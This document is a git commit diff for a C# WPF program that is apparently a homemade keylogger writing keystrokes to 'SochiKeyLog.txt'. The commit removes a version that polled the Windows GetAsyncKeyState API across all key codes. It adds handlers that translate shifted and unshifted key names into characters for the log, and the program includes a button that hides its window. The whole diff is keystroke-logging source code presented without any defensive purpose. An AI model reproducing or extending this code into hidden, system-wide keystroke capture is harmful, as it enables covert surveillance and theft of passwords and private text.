a16fccbda493af7d1149e2789b83dbfb12a84e97
dasad44 <dasad33_79@o2.pl>
2017-12-26 00:00:42 +0100

    Detection of keyboard(without enter and space)

--- WpfApplication8/MainWindow.xaml.cs
+++ WpfApplication8/MainWindow.xaml.cs
@@ -22,122 +22,34 @@ using System.Threading;
 
 namespace WpfApplication8
 {
-
     public partial class MainWindow : Window
     {
-        bool condition = false;
-        
-
+        bool condition = false;                                         //variables and importants actions
         StreamWriter file = new StreamWriter(@"SochiKeyLog.txt");
-        [DllImport("User32.dll", CharSet = CharSet.Auto)]
-        public static extern Int16 GetAsyncKeyState(int key);
-        
-        public void Save_With_Big_Letters(int key)
-        {
-            switch(key)
-            {
-                case 96:
-                    file.Write("0");
-                    break;
-                case 97:
-                    file.Write("1");
-                    break;
-                case 98:
-                    file.Write("2");
-                    break;
-                case 99:
-                    file.Write("3");
-                    break;
-                case 100:
-                    file.Write("4");
-                    break;
-                case 101:
-                    file.Write("5");
-                    break;
-                case 102:
-                    file.Write("6");
-                    break;
-                case 103:
-                    file.Write("7");
-                    break;
-                case 104:
-                    file.Write("8");
-                    break;
-                case 105:
-                    file.Write("9");
-                    break;
-                default:
-                    file.Write((char)key);
-                    break;
-            }
-        }
-        public void Save_With_Small_Letters(int key)
-        {
-            switch (key)
-            {
-                case 96:
-                    file.Write("0");
-                    break;
-                case 97:
-                    file.Write("1");
-                    break;
-                case 98:
-                    file.Write("2");
-                    break;
-                case 99:
-                    file.Write("3");
-                    break;
-                case 100:
-                    file.Write("4");
-                    break;
-                case 101:
-                    file.Write("5");
-                    break;
-                case 102:
-                    file.Write("6");
-                    break;
-                case 103:
-                    file.Write("7");
-                    break;
-                case 104:
-                    file.Write("8");
-                    break;
-                case 105:
-                    file.Write("9");
-                    break;
-                default:
-                    file.Write((char)(key));
-                    break;
-            }
-        }
+        /// <summary>
+        /// 
+        /// </summary>
         public MainWindow()
         {
             InitializeComponent();
         }
         public void Window_KeyDown(object sender, KeyEventArgs e)
         {
-            if (condition == true)
+            string key;
+            if (condition)
             {
-                int key;
-                int keyState;
-                for (key = 0; key < 127; key++)
+                if (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift))
                 {
-                    keyState = GetAsyncKeyState(key);
-                    if (keyState == 1 || keyState == -32767)
-                    {
-                        if(Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift ))
-                        {
-                            //Save_With_Big_Letters(key);
-                            label.Content = e.Key.ToString();
-                        }
-                        else
-                        {
-                            //Save_With_Small_Letters(key);
-                            label.Content = e.Key.ToString().ToLower();
-                        }
-                    }
+                    //label.Content = Convert.ToString(e.Key);
+                    key = Convert.ToString(e.Key);
+                    Save_With_Big_Letters(key);
                 }
-            }     
+                else
+                {
+                    key = Convert.ToString(e.Key);
+                    Save_With_Small_Letters(key);
+                }
+            }
         }
         public void Button_Click(object sender, RoutedEventArgs e)
         {
@@ -159,6 +71,193 @@ namespace WpfApplication8
         public void Hide_Click(object sender, RoutedEventArgs e)
         {
             this.Hide();
+        }
+          public void Save_With_Big_Letters(string key)
+          {
+              switch (key)
+              {
+                  case "OemMinus":
+                      file.Write("_");
+                      break;
+                  case "D0":
+                      file.Write(")");
+                      break;
+                  case "D1":
+                      file.Write("!");
+                      break;
+                  case "D2":
+                      file.Write("@");
+                      break;
+                  case "D3":
+                      file.Write("#");
+                      break;
+                  case "D4":
+                      file.Write("$");
+                      break;
+                  case "D5":
+                      file.Write("%");
+                      break;
+                  case "D6":
+                      file.Write("^");
+                      break;
+                  case "D7":
+                      file.Write("&");
+                      break;
+                  case "D8":
+                      file.Write("*");
+                      break;
+                  case "D9":
+                      file.Write("(");
+                      break;
+                  case "OemPlus":
+                      file.Write("+");
+                      break;
+                  case "back":
+                      file.Write("BACKSPACE");
+                      break;
+                  case "Divide":
+                      file.Write("/");
+                      break;
+                  case "Multiply":
+                      file.Write("*");
+                      break;
+                  case "Subtract":
+                      file.Write("-");
+                      break;
+                  case "Oem3":
+                      file.Write("~");
+                      break;
+                  case "tab":
+                      file.Write("TAB");
+                      break;
+                  case "OemOpenBrackets":
+                      file.Write("{");
+                      break;
+                  case "Oem6":
+                      file.Write("}");
+                      break;
+                  case "Oem5":
+                      file.Write("|");
+                      break;
+                  case "Add":
+                      file.Write("+");
+                      break;
+                  case "Oem1":
+                      file.Write(":");
+                      break;
+                  case "OemQuotes":
+                      file.Write("\"");
+                      break;
+                  case "OemComma":
+                      file.Write("<");
+                      break;
+                  case "OemPeriod":
+                      file.Write(">");
+                      break;
+                  case "Decimal":
+                      file.Write(",");
+                      break;
+                  case "OemQuestion":
+                      file.Write("?");
+                      break;
+                  default:
+                      file.Write(Convert.ToString(key));
+                      break;
+              }
+          }
+          public void Save_With_Small_Letters(string key)
+        {
+         // file.Write(letter.ToString().ToLower());
+            switch (key.ToLower())
+            {
+                case "oemminus":
+                    file.Write("-");
+                    break;
+                case "d0":
+                    file.Write("0");
+                    break;
+                case "d1":
+                    file.Write("1");
+                    break;
+                case "d2":
+                    file.Write("2");
+                    break;
+                case "d3":
+                    file.Write("3");
+                    break;
+                case "d4":
+                    file.Write("4");
+                    break;
+                case "d5":
+                    file.Write("5");
+                    break;
+                case "d6":
+                    file.Write("6");
+                    break;
+                case "d7":
+                    file.Write("7");
+                    break;
+                case "d8":
+                    file.Write("8");
+                    break;
+                case "d9":
+                    file.Write("9");
+                    break;
+                case "oemplus":
+                    file.Write("=");
+                    break;
+                case "back":
+                    file.Write("BACKSPACE");
+                    break;
+                case "divide":
+                    file.Write("/");
+                    break;
+                case "multiply":
+                    file.Write("*");
+                    break;
+                case "subtract":
+                    file.Write("-");
+                    break;
+                case "oem3":
+                    file.Write("`");
+                    break;
+                case "tab":
+                    file.Write("TAB");
+                    break;
+                case "oemopenbrackets":
+                    file.Write("[");
+                    break;
+                case "oem6":
+                    file.Write("]");
+                    break;
+                case "oem5":
+                    file.Write("\\");
+                    break;
+                case "add":
+                    file.Write("+");
+                    break;
+                case "oem1":
+                    file.Write(";");
+                    break;
+                case "oemquotes":
+                    file.Write("'");
+                    break;
+                case "oemcomma":
+                    file.Write(",");
+                    break;
+                case "oemperiod":
+                    file.Write(".");
+                    break;
+                case "decimal":
+                    file.Write(",");
+                    break;
+                case "oemquestion":
+                    file.Write("/");
+                    break;
+                default:
+                    file.Write(Convert.ToString(key).ToLower());
+                    break;
+            }
         }
     }
 }
